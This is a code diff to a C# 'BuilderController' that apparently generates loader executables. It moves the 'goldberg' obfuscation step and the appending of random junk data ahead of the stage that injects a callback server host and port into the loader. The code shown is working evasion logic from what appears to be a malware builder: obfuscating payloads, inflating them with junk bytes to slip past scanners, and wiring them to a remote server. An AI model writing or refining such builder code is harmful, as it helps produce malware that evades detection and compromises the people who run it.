@@ -552,8 +552,35 @@ public class BuilderController : ControllerBase
                 await EmbedIconAndMetadata(req, exePath, job);
             }
 
+            // ── Goldberg obfuscation ──
+            if (req.EnableObfuscation)
+            {
+                job.Log("Running goldberg obfuscation...");
+                try
+                {
+                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
+                    if (goldbergResult.ExitCode == 0)
+                        job.Log("Goldberg obfuscation completed.");
+                    else
+                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
+                }
+                catch (Exception ex)
+                {
+                    job.Log($"[WARN] goldberg not available: {ex.Message}");
+                }
+            }
+
+            // ── Junk data injection ──
+            if (req.InjectJunkData && req.JunkDataMb > 0)
+            {
+                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
+                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
+                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
+                await fs.WriteAsync(junk);
+            }
+
             // ══════════════════════════════════════════════════════════════
-            // Stage 4: Inject Config into Loader
+            // Stage 4: Inject Config into Loader (MUST be last — after obfuscation/junk)
             // ══════════════════════════════════════════════════════════════
             job.Log("=== Stage 4: Injecting Config ===");
             var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
@@ -588,33 +615,6 @@ public class BuilderController : ControllerBase
             }
 
             job.Log($"Config injected: {configJson.Length} bytes");
-
-            // ── Goldberg obfuscation ──
-            if (req.EnableObfuscation)
-            {
-                job.Log("Running goldberg obfuscation...");
-                try
-                {
-                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
-                    if (goldbergResult.ExitCode == 0)
-                        job.Log("Goldberg obfuscation completed.");
-                    else
-                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
-                }
-                catch (Exception ex)
-                {
-                    job.Log($"[WARN] goldberg not available: {ex.Message}");
-                }
-            }
-
-            // ── Junk data injection ──
-            if (req.InjectJunkData && req.JunkDataMb > 0)
-            {
-                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
-                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
-                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
-                await fs.WriteAsync(junk);
-            }
 
             // ── Move to final output ──
             var finalDir = Path.Combine(OutputBase, buildId);
